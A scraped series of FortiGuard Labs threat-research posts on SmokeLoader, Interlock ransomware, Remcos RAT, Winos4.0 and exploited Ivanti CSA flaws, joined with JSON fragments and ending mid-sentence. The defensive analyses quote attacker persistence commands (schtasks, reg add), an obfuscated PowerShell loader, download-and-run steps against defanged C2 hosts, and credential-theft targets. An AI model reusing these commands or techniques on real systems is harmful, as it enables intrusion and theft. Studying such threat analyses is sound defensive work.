enumerates the registry keys under possible related registry keys to find the following values: It searches forsitemanager.xml,recentservers.xml, andfilezilla.xmlin the installation folder under%APPDATA%,%LOCALAPPDATA%orC:\\ProgramDatato collect the content in thehost,Port,User, andPasstags in these files. It enumerates the registry keys underSoftware\\Martin Prikrylto find theHostName,UserName,Password,RemoteDirectory, andPortNumbervalues. Email client keyword Path Outlook .pst, .ost Thunderbird .mab, .msf, inbox, sent, draft, template, archive The Bat! .tbb, .tbn, .abn When a data file is found, the plugin parses its structure to obtain the email addresses of people who sent an email to the victim or who received a copy of the email. The email addresses are then sent to the C2 server, and the process is closed. iexplore.exe, microsoftedge.exe, microsoftedgecp.exe, firefox.exe, chrome.exe, opera.exe, msedge.exe, plugin-container.exe (sub-process of Firefox, the relevant cookies are for Macromedia flash player) It then constantly monitors currently running processes and injects the other part of the plugin into target browsers to hook specified APIs. Like other plugins, the injected code includes shellcode, a decryption algorithm, and encrypted data. The difference is that the code for the jump to the shell code is written to theatanfunction ofntdll,and the plugin callsCreateRemoteThreadto run theatanfunction in the target process. The plugin hooks different APIs depending on where it is injected: Process DLL API firefox.exe Kernel32.dll VirtualQuery nspr4.dll or nss3.dll PR_GetDescType nspr4.dll PR_Write iexplore.exe microsoftedgecp.exe wininet.dll msedge.dll, chrome.dll, opera.dll, opera_browser.dll Unknown function Before setting the hook, it suspends threads except for the current thread of the injected process. Next, it modifies code at the start of the target APIs to jump to the function to send data passed to the API to the C2 server. The plugin obtains the addresses of most target APIs by callingGetProcAddress. The only exception is the method to get the unknown function in DLL files related to the browsers based on Chromium. It parses the structure of the.rdatasection to find the function matching a specific byte pattern. When the hooks are set, the plugin resumes other threads of the current process and terminates the current thread. Plugin 6 uses the same method to inject hooking code snippets into target processes. The API functions to hook areWSASendand thesendfunction inws2_32.dll. When these functions are called, the plugin collects FTP, SMTP, IMTP, and POP3 hostnames. DLL API Target user32.dll TranslateMessage Keyboard states and the window name where the user inputs the data GetClipboardData Get clipboard content SmokeLoader is a modular malware that is adaptable to different needs. In this case, SmokeLoader performs its attack with its plugins instead of downloading a completed file for the final stage. This shows the flexibility of SmokeLoader and emphasizes that analysts need to be careful even when looking at well-known malware like this. FortiGuard will continue monitoring these attack campaigns and provide appropriate protections as required.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Interlock ransomware. Affected platforms:Microsoft Windows, FreeBSDImpacted parties:Microsoft Windows and FreeBSD usersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Interlock is a new ransomware variant that was first submitted to a publicly available file-scanning site in early October 2024. This could indicate that the ransomware emerged as early as September or even earlier. The Interlock ransomware comes in Windows and FreeBSD versions. It encrypts files on victims' machines and demands a ransom to decrypt them via dropped ransom notes. While the initial infection vector of the Interlock ransomware has not been identified, researcher Sina Kheirkhah(@SinSinology)reportedthat a previously unknown backdoor was found on a victim’s machine. It is possible that the ransomware was deployed through this backdoor. The Windows version of the ransomware claims to support the following versions of Windows: The Interlock ransomware takes the following parameters on execution: Once executed, the Interlock ransomware encrypts files on victims’ machines and drops a ransom note labeled “!__README__!.txt”. Files encrypted by the Interlock ransomware will have a “.interlock” file extension. The ransomware is designed to exclude the following files and filetypes from file encryption: .bat .bin .cab .cmd .com .cur .diagcab .diagcfg .diagpkg .drv .hlp .hta .ico .msi .ocx .psm1 .scr .sys .ini Thumbs.db .url .dll .exe .ps1 It also excludes the following folders from file encryption: $Recycle.Bin Boot Documents and Settings PerfLogs ProgramData Recovery System Volume Information Windows It also creates a scheduled task named \"TaskSystem\": schtasks /create /sc DAILY /tn \"TaskSystem\" /tr \"cmd /C cd %s && %s\" /st 20:00 /ru system > nul The above script creates a new scheduled task, TaskSystem, that runs every day at 20:00 using the System account. The FreeBSD version of the ransomware takes parameters on execution: Once the ransomware is executed, it encrypts files on victims' machines using the AES-CBC encryption algorithm and adds an \".interlock\" extension to the encrypted files. The ransomware then leaves a text file containing the same ransom note as the Windows version. The FreeBSD version of the Interlock ransomware skips files with an “.interlock”  extension from file encryption. It also excludes the following directories from file encryption: /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /run /root /sbin /snap /srv /sys /tmp /usr /var It also avoids encrypting the following file: At the time of our investigation, the Interlock ransomware data leak site listed six victims. Five of those were in the United States, and the other was in Italy. However, submission data to the publicly available scanning service potentially shows even broader victim locations. Interlock ransomware samples have been submitted from India, Italy, Japan, Germany, Peru, South Korea, Turkey, and the United States. The victims are in the education, finance, government, healthcare, and manufacturing sectors, indicating that the Interlock ransomware does not have a policy to avoid targeting essential businesses and organizations, as some other ransomware groups have. Each victim has its own page describing the victim’s organization and lists stolen and leaked files. The Interlock ransomware runs its data leak site on TOR, which is divided into the following four sections: The Interlock ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance against phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, Fortinet delivers native synergy and automation across your security ecosystem. It also provides an extensive portfolio of technology- and human-based as-a-service offerings powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts. It provides unrivaled threat intelligence on the latest threat actor activity across the dark web, enabling a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to respond rapidly to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "content": "FortiGuard Labs Threat Research As the holiday season approaches, shoppers worldwide eagerly anticipate snagging deals during Black Friday, Cyber Monday, and other holiday sales. However, this heightened online activity also draws the attention of cybercriminals. A recent report from FortiGuard Labs,Understanding Threat Actor Readiness for the Upcoming Holiday Season, reveals the advanced tactics attackers have been developing to exploit this year’s shopping frenzy. This blog highlights the report’s key findings from the darknet and offers some practical advice to help shoppers and businesses stay secure this season. The holiday season presents an irresistible opportunity for cybercriminals to capitalize on increased online transactions. Tools and services now available on the darknet empower attackers to target e-commerce platforms and unsuspecting shoppers more effectively than ever. This year, threat actors are leveraging cutting-edge techniques, including AI-powered phishing lures, sophisticated website cloning tools, and remote code execution (RCE) exploits to gain unauthorized access to shopping platforms. AI-driven methods allow attackers to craft convincing emails and replicas of legitimate websites to steal data or trick users into disclosing sensitive information. The report also highlights the growing use of deceptive holiday-themed domains that mimic trusted retailers to lure shoppers with enticing but fraudulent offers. Sniffing tools are another critical weapon that enables cybercriminals to intercept sensitive data like credit card details during online transactions. Key highlights from the report include: To mitigate these risks, shoppers and businesses must adopt proactive measures. Vigilance is essential for shoppers. Double-check URLs before entering sensitive information and use secure payment methods such as credit cards with fraud protection. Avoid shopping over public Wi-Fi networks, which can leave you vulnerable to session hijacking. And enabling multi-factor authentication on your accounts can provide an additional layer of security. It is also crucial to monitor your financial statements regularly for unauthorized transactions. Businesses must prioritize their cybersecurity posture. Keeping e-commerce platforms and plugins up to date and conducting regular vulnerability scans can significantly reduce risk. Implementing advanced fraud detection tools helps identify unusual activities, such as brute-force login attempts or fake traffic. Educating customers on recognizing phishing attempts and promoting safe shopping habits is equally important. Monitoring domain registrations for potential impersonations and reporting them promptly can help protect your brand. Finally, securing admin panels with strong passwords and restricted access can prevent unauthorized breaches. The holiday season should be a time of joy and celebration, not risk and vulnerability. However, for this to happen, businesses must take a proactive stance on cybersecurity while consumers must stay informed and cautious about the threats lurking online.

    "content": "FortiGuard Labs Threat Research While threat actors continue to rely on many “classic” tactics that have existed for decades, our threat predictions for the coming year largely focus on cybercriminals embracing bigger, bolder, and, from their perspectives, better attacks. From Cybercrime-as-a-Service (CaaS) groups becoming more specialized to adversaries using sophisticated playbooks that combine both digital and physical threats, cybercriminals are upping the ante to execute more targeted and harmful attacks. In our2025 threat predictions report, our FortiGuard Labs team looks at tried-and-true attacks cybercriminals continue to rely on and how these have evolved, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations worldwide can enhance their resilience in the face of a changing threat landscape. As cybercrime evolves, we anticipate seeing several unique trends emerge in 2025 and beyond. Here’s a glimpse of what we expect. Cybercriminals will always find new ways to infiltrate organizations. Yet there are numerous opportunities for the cybersecurity community to collaborate to better anticipate adversaries’ next moves and interrupt their activities in a meaningful way. The value of industrywide efforts and public-private partnerships cannot be overstated, and we anticipate that the number of organizations participating in these collaborations will grow in the coming years. Additionally, organizations must remember that cybersecurity is everyone’s job, not just the responsibility of the security and IT teams. For example, implementing enterprisewide security awareness and training is a vital component of managing risk. And finally, other entities have a responsibility to promote and adhere to robust cybersecurity practices, ranging from governments to the vendors that manufacture the security products we rely on. No single organization or security team can disrupt cybercrime alone. By working together and sharing intelligence across the industry, we’re collectively better positioned to fight against adversaries and effectively protect society.

    "title": "New Campaign Uses Remcos RAT to Exploit Victims",
    "link": "https://www.fortinet.com/blog/threat-research/new-campaign-uses-remcos-rat-to-exploit-victims",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control a victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently noticed a phishing campaign in the wild. It is initialized with a phishing email containing a malicious Excel document. Upon researching the campaign, I found it was spreading a new variant of the Remcos RAT. Remcos is a commercial RAT (remote administration tool) sold online. It provides purchases with a wide range of advanced features to remotely control computers belonging to the buyer. However, threat actors have abused Remcos to collect sensitive information from victims and remotely control their computers to perform further malicious acts. Figure 1 displays the Remcos webpage. In this security blog, I will show how Remcos is delivered to a victim’s device, what kinds of anti-analysis techniques it leverages to protect itself from being analyzed, how this variant of Remcos is deployed, how it achieves persistence on the victim’s device, and what advanced features Remcos provides to remotely control a victim’s device. The phishing email is shown in Figure 2. It contains an attached malicious Excel file disguised as an order file to convince the recipient to open the document. CVE-2017-0199is a Remote Code Execution vulnerability that exploits how Microsoft Office and WordPad parse specially crafted files. Once the recipient opens the attached file, the MS Excel program shows the file content, as seen in Figure 3. In the background, the CVE-2017-0199 vulnerability is exploited to download an HTA file and execute it on the recipient’s device. As you may know, a crafted embedded OLE object leads to this vulnerability. Figure 4 demonstrates the content of the crafted embedded OLE object (“\\x01Ole”). MS Excel program accesses the short URL “hxxps://og1[.]in/2Rxzb3.” It is then redirected to another URL, “hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.hta”. The download packet, shown in Figure 5, is a Wireshark screenshot. The HTA file is an HTML Application file. It is executed by a Windows-native application (mshta.exe) called by MS Excel using DCOM components. Its code is wrapped in multiple layers using different script languages and encoding methods, including JavaScript, VBScript, Base64-encoded, URL-encoded, and PowerShell, to protect itself from detection and analysis. Figure 6 shows some script code examples. These are executed when the downloaded HTA file is parsed in mshta.exe. Take a look at the Powershell code at the bottom of Figure 6. It calls the API URLDownloadToFile() to download an EXE file from the URL “hxxp://192[.]3[.]220[.]22/430/dllhost.exe” into a local file, “%AppData%\\dllhost.exe.” Executing “STaRt $EnV: APPDATA\\dllhost.exe” starts the downloaded EXE file on the victim’s device. Once the downloaded EXE file, dllhost.exe, starts, it extracts a batch of files into the %AppData% folder. Figure 7 is a screenshot of the extracted files and sub-folders located in %AppData%\\intercessionate\\Favourablies117\\sulfonylurea. Some of the key data are hidden in these files. dllhost.exe then runs the PowerShell program by calling the API CreateProcessW() to execute a piece of PowerShell code, as illustrated in Figure 8. Since dllhost.exe is a 32-bit process, it runs a 32-bit PowerShell, “C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe.” This is important because the malicious code only works on the 32-bit PowerShell process. The PowerShell code breaks down as follows. $krjning=Get-Content -Raw '%AppData% \\intercessionate\\Favourablies117\\sulfonylurea\\Aerognosy.Res';$Lukewarmly95=$krjning.SubString(5322,3);.$Lukewarmly95($krjning) It reads the content of “Aerognosy.Res,” an extracted file, into a local variable “$krjning,” which is full of PowerShell script. “iEx” is the return value of SubString(5322,3), which is short for an Invoke-Expression used to run a string as a command or expression.  Finally, “iEx” executes the entire PowerShell script (“Aerognosy.Res”) after calling “.$Lukewarmly95($krjning).” Again, the PowerShell code is thoroughly obfuscated and encoded. Based on my research on the code, I discovered it performs the following functions: As I mentioned, the copied malicious code relies on a 32-bit version of PowerShell. It first runs a piece of self-decryption code mixed with a huge amount of useless instructions, creating a big challenge for analysts. Figure 10 presents the end of the decrypting code, where it is about to execute the “call edi” instruction. The EDI register now points to the decrypted code, as shown on the right. It leverages numerous complicated anti-analysis techniques to protect itself from being analyzed. 1.  It installs a vectored exception handler. Whenever an exception occurs, the exception handler is called to handle it. The exception code provides corresponding ways to restore the code to resume from another offset. There are numerous exception instructions inside the malicious code. In other words, this strategy drives the entire code. Figure 11 shows an instruction that can raise an exception (0x8000003) at 0xEE16222, which the exception handler will then capture and handle. The exception handler function also checks the DR registers (Debug Registers), which are Dr0, Dr1, Dr2, Dr3, Dr4, Dr5, Dr6, and Dr7. Their values are not 0 when a debugger is present. 2.  System APIs are dynamically gained and called in a unique way. There are no API name constant strings in the code. Instead, it keeps the hash codes of the API names. Whenever it calls an API, it uses a unique function that retrieves the API information from the PEB, which is pointed to by fs:[30h] to get their function address by matching the name’s hash code. This raises the difficulty of performing static analysis. In addition, it has another function that is called every time an API is called. This function detects if the debugger has set the API breakpoint. It also encrypts the code from the caller’s return address to the base address, which cleans up the code just executed. 3.  It is called ZwSetInformationThread(), and it performs anti-debugging. The malicious code calls API ZwSetInformationThread() with the argument  ThreadHideFromDebugger (0x11) and the current thread (0xFFFFFFFE). This mechanism in Windows can conceal a thread’s existence from debuggers. Figure 12 illustrates how it calls this API with the associated arguments. If a debugger is attached to the current process, it exits immediately once the API is called. 4.  It checks the result value of API ZwQueryInformationProcess(). It calls API ZwQueryInformationProcess() with the ProcessDebugPort (7) argument to detect if the debugPort is set (non-zero value). If yes, this means a debugger is attached to the current process (PowerShell.exe). 5.  All the constant values are gained at run time. Please refer to the code snippet below to see how it splits “mov ebx 100h” into three instructions. 6.  It uses an API hooking technique for several APIs. The malicious code simulates executing multiple API instructions (say, two instructions) at the beginning and then jumps to the API to execute the rest of the instructions (beginning with the 3rd instruction). Below is an example for CreateProcessInternalW(). The highlighted codes are simulated, which can invalidate any API breakpoints. Whenever any of the above detection conditions are triggered, the current process (PowerShell.exe) can become unresponsive, crash, or exit unexpectedly. The malicious code performs process hollowing to put itself into a newly created Vaccinerende.exe process (copied from dllhost.exe). To do this, it calls the API CreateProcessInternalW() with CreatFlags of CREATE_SUSPENDED (0x4), which will suspend the new process after it is created. It then calls some related APIs to transfer all the malicious code to the new process and run it. The relevant APIs are NtAllocateVirtualMemory(), ZwCreateSection(), NtMapViewOfSection(), NtGetContextThread(),  NtSetContextThread(), and NtResumeThread(). It performs all the anti-analysis detections described in the above section and then uses a workflow different from the PowerShell process. According to my research, it finishes some tasks, like maintaining persistence, downloading and decrypting the Remcos payload execution, and starting the downloaded Remcos in memory. The malicious code adds a new auto-run item to the system registry to maintain persistence and maintain control of the victim’s device when it is restarted. Figure 14 shows the malicious code as it is about to run the REG (reg.exe) process to add the auto-run item and how it appears in the Registry Editor. It calls the API ShellExecuteW() to run cmd.exe with a command line string of /c REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Chivey57\" /t REG_EXPAND_SZ /d \"%Misbehavers% -windowstyle 1 $Frligheden=(gp -Path 'HKCU:\\Software\\Roscoelite\\').Aftvttedes;%Misbehavers% ($Frligheden).\" “%Misbehavers%” has been defined as the full path to the 32-bit PowerShell.exe in the system environment. It reads a piece of PowerShell code, which is the same as the PowerShell code that dllhost.exe executes, from a string value called “Aftvttedes” in the system registry. Next, the malicious code downloads an encrypted file from the URL “hxxp[:]//192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.bin.”  The file contains the encrypted Remcos malware. To download the file, some relevant APIs, like InternetOpenA(), InternetOpenUrlA(), and InternetReadFile(), are called in a row. After decrypting the downloaded file, I found a new variant of Remcos. Rather than saving the Remcos file into a local file and running it, it directly deploys Remcos in the current process's memory (Vaccinerende.exe). In other words, it is a fileless variant of Remcos. It then starts Remcos on a thread, where the thread function (StartAddress) is the entry point. To start the thread, it calls an undocumented API, NtCreateThreadEx(). Figure 15 shows a screenshot of the debugger as it is about to call the API to start Remcos. Each Remcos variant has a setting block with a batch of configurations that control how Remcos operates on the victim’s device. The setting block is encrypted and saved in the Resource section named “SETTINGS,” which gets decrypted at the start and initializes Remcos with the setting block. Look at Figure 16 to examine the decrypted setting block in memory. The setting block has 57 values in total, which are separated by “\\x7C\\x1E\\x1E\\x1F\\x7C”, as illustrated in Figure 16. The values in the setting block are retrieved by their index, from 0 to 56, through a special function. The setting values tell Remcos how to do its work on the victim’s device, including the C&C server IP address and port, Remcos’ name, Remcos’ mutex name (also registry key name), a Remcos license number, the keylogger’s local log file, a couple of certificates used to verify and communicate with the C&C server, and several switch flags indicating if a feature is enabled or disabled, such as Keylogger, Screenshot, Watchdog, Record audios, Reset browsers’ login, and more. The C&C server IP&Port string at index 0 is “107[.]173[.]4[.]16:2404:1,” where “107[.]173[.]4[.]16” is the IP address, “2404” is the TCP port, and the last “1” means that it enables TLS to communicate with the C&C server. Remcos collects some basic information from the victim’s device. It then encrypts and sends the collected data to its C&C server to register that the victim’s device is online and ready to be controlled. This is the first command packet sent to the C&C server. The memory dump data in Figure 17 shows the content of the register packet (command ID 4Bh) that is about to be encrypted. When TLS is enabled (as set in the settings block), packets follow the same structure, whether sending or receiving. These packets consist ofPacket Magic(like 0xFF0424) +Command Data Size(like 0x2C6) +Command ID(like 0x4B) +Command Data+Packet Type(like 0x17, 0x16, and 0x15). I will break down the command data of the 4B to explain what basic information Remcos collects from the victim’s device. The command data has many separators (“\\x7C\\x1E\\x1E\\x1F\\x7C”) to separate the collected basic information. After registering the victim’s device on the C&C server, it receives a control command packet from the server to perform further work on the victim’s device. These features and corresponding commands are detailed below. This example of control command 06h asks Remcos to obtain all running process lists from the victim’s device. Remcos sends a 4Fh command packet with the collected process list consisting of the process name, PID, architecture (64bit or 32bit), and the full path, as shown in Figure 18. Figure 19 is a screenshot of the C&C server view of the process list. Remcos includes a function that parses the received control command data from the server and then performs the corresponding action on the victim’s device. My analysis of this function shows that Remcos has the features and commands listed in the following chart. In this analysis, I walked through the entire process of the phishing campaign. It begins with a phishing email with an attached OLE Excel document. This disguised email is used to trick the recipient into opening the attached Excel document. The CVE-2017-0199 vulnerability is exploited once the Excel file is opened on the victim’s device. It then downloads an HTA file and executes it on the device. Multiple script languages are leveraged to download an EXE file (dllhost.exe), which then starts the 32-bit PowerShell process to load the malicious code from extracted files and execute it in the PowerShell process. Next, I explained what anti-analysis techniques are used in the code, such as a vectored exception handler, dynamically gained APIs, dynamically calculated constant numbers, the APIs ZwSetInformationThread() and ZwQueryInformationProcess(), and API hooking. After passing the detections introduced in the anti-analysis part, it performs process hollowing to run the malicious code in the new process “Vaccinerende.exe,” which not only ensures persistence on the victim’s device but also downloads and decrypts the Remcos payload file. I then elaborated on how it keeps Remcos in memory and starts its entry point function in a thread (API NtCreateThreadEx()). Subsequently, I explained how Remcos works with its setting block on the victim’s device, how Remcos communicates with its C&C server, and what the format of the traffic packet looks like. Finally, I focused on introducing the features this Remcos variant can perform on the victim’s device and listing the relevant control commands for each feature. Figure 20 shows the entire process of the phishing campaign. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions offers advanced protection against both known and unknown phishing attempts.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:Medium Winos4.0 is an advanced malicious framework that offers comprehensive functionality, a stable architecture, and efficient control over numerous online endpoints to execute further actions. Rebuilt from Gh0strat, it includes several modular components, each handling distinct functions. Winos4.0 has been deployed in various attack campaigns, such as Silver Fox. FortiGuard Labs has identified multiple samples of this malware hidden within gaming-related applications, including installation tools, speed boosters, and optimization utilities. Analysis of the decoded DLL file reveals a potential targeting of the education sector, as indicated by its file description, “校园政务” (Campus Administration). In this blog post, we will delve into a comprehensive technical analysis of a campaign that leveraged these applications to deliver Winos4.0. Initial access is achieved by distributing game-related applications designed for optimization or installation. After the victim runs the application, it retrieves a fake BMP file from the server ad59t82g[.]com. The file is then XOR decoded, extracting the DLL “you.dll,” which is loaded through its export function “you” to proceed to the next stage. This DLL file is responsible for setting up the execution environment. It begins by downloading three files from the same remote path “hxxp://ad59t82g[.]com/1/” used in the previous stage. A folder with a random name is then created in “C:\\Program Files (x86),” where” text.bmp” is saved as “t3d.tmp,” “d.bmp” as “t4d.tmp,” and “t2.bmp” as “t5d.tmp.” It then extracts “t3d.tmp” using the password “lalala123%,” obtaining three clean files: u72kOdQ.exe, MSVCP140.dll, and VCRUNTIME140.dll. Next, it decodes “t4d.tmp” with XOR key 0x67080000 to reveal the main malicious file, “libcef.dll.” The purpose of the three extracted files is to load “libcef.dll” to inject shellcode. The DLL is named “学籍系统,” meaning “Student Registration System,” suggesting that the threat actor may be targeting educational organizations. Next, It checks for the presence of a window with the specific class name “Q360SafeMonClass.” If the window is not found, it proceeds to establish persistence by adding the executable “u72kOdQ.exe” to the registry key “SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN” under the name “WINDOWS.” It then loads the “Shell32” library and calls “ShellExecuteA” to execute u72kOdQ.exe. If the window “Q360SafeMonClass” is present, it transfers to setting a scheduled task. It downloads another encoded file, “hxxp://ad59t82g[.]com/1/h[.]bmp.” The XOR-decoded result is an MSIL file embedded with a Base64-encoded command. The decoded command intends to create a scheduled task named “Window Defender Uqdata” that executes a specified command (execute “u72kOdQ.exe”) starting one minute from the current time, with a repetition interval of one minute and configured to restart up to three times if necessary. The task runs with the highest privileges (RunLevel 1). Following the persistence setup, the malicious DLL “libcef.dll” decodes “t5d.tmp” using an XOR key 0x67080000. Once decoded, it injects the extracted shellcode, preparing it to execute actions within the compromised environment. The shellcode dynamically loads APIs, as shown in Figure 13. The shellcode retrieves configuration data by searching for the marker string “codecode,” a change from the previous version, which used the string “codemark” for this purpose. The malware retrieves the C2 address 202[.]79[.]173[.]4 and port 80, establishing a connection using the TCP protocol (t1:1). It sends “x32” to the C2 for module downloading, which serves to check in the victim. The downloaded module consists of encrypted data with a size of 0x4B00E. The data is decrypted using a simple XOR operation with the key value of 0x2B. The decrypted 32-bit module is “上线模块.dll.” It is then executed, leading to the next stage. The modules described in the following sections are all components of Winos4.0. They facilitate online functionality, including logging in and checking in with the server. Additionally, they enable the retrieval of C2 commands and downloading modules. The entry first calls a function to check whether the value of the registry key “HKEY_CURRENT_USER\\\\Console\\\\IpDate” is valid. This value will later be used to update the main server address in the subsequent payload downloaded via C2. Once it confirms that it can reach the C2 server, it then downloads encoded data from its C2. It saves the XOR-decoded results in the registry “HKEY_CURRENT_USER \\\\Console\\\\0\\\\ d33f351a4aeea5e608853d1a56661059.” Once the module is configured for the next stage, the C2 server address information is recorded in the registry key “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IpDates_info.” This module is responsible for information collection, environment checks, and core backdoor functionality. Its functions include: During this campaign's attack, we retrieved two plugins from the command and control (C2) server, which are stored in the registry under the key “HKEY_CURRENT_USER\\\\Console\\\\0.” These modules are specifically designed to capture screenshots and manage documents. Upon receiving directives from the C2 server, these plugins facilitate uploading documents from the compromised system, enabling the attacker to gather sensitive information and discreetly monitor activities. Winos4.0 is a powerful framework, similar to Cobalt Strike and Sliver, that can support multiple functions and easily control compromised systems. Threat campaigns leverage Game-related applications to lure a victim to download and execute the malware without caution and successfully deploy deep control of the system. The entire attack chain involves multiple encrypted data and lots of C2 communication to complete the injection. Users should be aware of any new application's source and only download the software from qualified sources.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Ivanti Cloud Services Appliance version 4.6 and priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical Today FortiGuard Labs is releasing this blog post about a case where an advanced adversary was observed exploiting three vulnerabilities affecting the Ivanti Cloud Services Appliance (CSA). At the time of our investigation, two out of the three identified vulnerabilities were not publicly known. This incident is a prime example of how threat actors chain zero-day vulnerabilities to gain initial access to a victim’s network. In a recent incident response engagement, FortiGuard Incident Response (FGIR) services were engaged by a customer to investigate malicious communication originating from their network. During the investigation, FGIR came across an adversary who had gained access to the customer’s network by exploiting the CVE-2024-8190 and two previously unknown vulnerabilities affecting the PHP front end of the Ivanti CSA appliance. The incident was detected by the customer on September 9, 2024, when some of its internal systems were found to be communicating to a malicious IP address,206[.]189[.]156[.]69. FGIR was engaged the next day. During the IR investigation, FGIR observed that the threat actor exploited the vulnerability CVE-2024-8190 in conjunction with the following two previously publicly unknown vulnerabilities: These resources are located under the root folder of the PHP web front, which serves as the management console of the CSA. On September 19, 2024, FGIR disclosed to Ivanti’s security team the discovery of the two new vulnerabilities. During the meeting, the Ivanti team claimed that they were aware and tracking the two publicly unknown exploited vulnerabilities. On September 19, Ivanti published the advisory for CVE-2024-8963, which addressed the path traversal vulnerability. On September 10, 2024, at 14:00:02, Ivanti published the security advisoryCVE-2024-8190on their forum. The advisory informed about the discovery of an authenticated command injection vulnerability in theDateTimeTab.phpresource, affecting CSA 4.6 with patch 518 and earlier versions. On September 13, 2024, the CVE-2024-8190 vulnerability was added to the CISA’s Known Exploited Vulnerabilities list. On the same date, Ivanti updated their security advisory to mention that, following public disclosure of the September 10th, exploitation of the command injection vulnerability had been observed in the wild. On September 16, 2024, the research team at Horizon3.ai publishedthe detailsrelated to the CVE-2024-8190 vulnerability and also released a proof of concept exploit code. During the incident response investigation, FGIR observed that the threat actor exploited a path traversal vulnerability on the resource/client/index.phpto gain unauthorized authenticated access to the resource/gsb/users.phpby sending the following web request: The first of such requests was sent by the threat actor on September 4, 2024, at 06:53:14 UTC, right before the exploitation of the command injection vulnerability, affecting the resource/gsb/reports.php. The resource/client/index.phpon the PHP web front of the Ivanti CSA appliance can be accessed by unauthenticated users to download the “LANDESK Remote Assistance Client” software package. The following picture shows how the resource/client/index.phplooks when opened in a browser: Upon inspecting the /client/index.php’s code, FGIR discovered that, by clicking the “Install now” button present on it, the user is redirected to a resource called /client/download.php: The resource/client/download.phpredirects the user to the pageOnDemand.phpvia the header function. The resource/client/OnDemand.phpcontains the code to open a local file calledLDSupport.exe, using the php functionpopen. The local fileis served to the user via the phpechocommand. The threat actor sent a malformed URL to the resource/client/index.php,by inserting%3F.phpat the end of the URI, and appended the URL with the location of the php resource to be accessed through path traversal. Using this technique, the threat actor managed to access the resource/gsb/users.php. The appended resource,/gsb/users.php, was assigned to the variable$filenamein the/client/OnDemand.phpcode, which led to the path traversal vulnerability, allowing the threat actor to view the list of users configured in the CSA appliance. FGIR simulated the exploitation of this vulnerability in its lab environment to understand what information could be acquired with it and the figure below shows the resulting output, which includes the list of users configured on the test appliance: The threat actor exploited this vulnerability several times over the course of their intrusion to access other resources as well, with connections originating from various IP addresses. As seen in the screenshot below, which has all times expressed using the timezone UTC-007, the threat actor used the same vulnerability to access the resource/gsb/datetime.phpas well. FGIR states with medium confidence that the threat actor exploited this path traversal vulnerability to gain access to the resource/gsb/users.phpnot only to list users, but also to attempt to create rogue users and gain authenticated access to the CSA web front end. Themessageslogs contain evidence of the threat actor creating two users:aiadminandservices, using the CSA utility calleddbtool. This was likely performed to maintain persistent, authenticated access to the CSA management console. After the threat actor exploited the path traversal vulnerability and enumerated users configured on the CSA appliance, they exploited CVE-2024-8190, the command injection vulnerability affecting the resource /gsb/DateTimeTab.php, to attempt to access the credentials of those users. FGIR observed evidence of this exploitation in Ivanti’s broker logs, as seen in the snippet below. FGIR has high confidence that the threat actor exploited this vulnerability to gain access to the user,admin’s credentials and use these privileged credentials to carry out the authenticated exploitation of the command injection vulnerability in/clients/reports.phpresource. FGIR found the text “rewritten with new timezone” within the functionsetPhpTimeZone($timezoneinfo)of the resourceDateTimeTab.php. From the above systemLog function call, it is clear that the value of the variable, $timezone was the one that was manipulated by the threat actor. Tracing back the value of this variable shows that it was deduced from the parameter$timezoneinfo, which was passed to the functionsetPhpTimeZone. Tracing back where thesetPhpTimeZonewas called, FGIR found that this happened within the 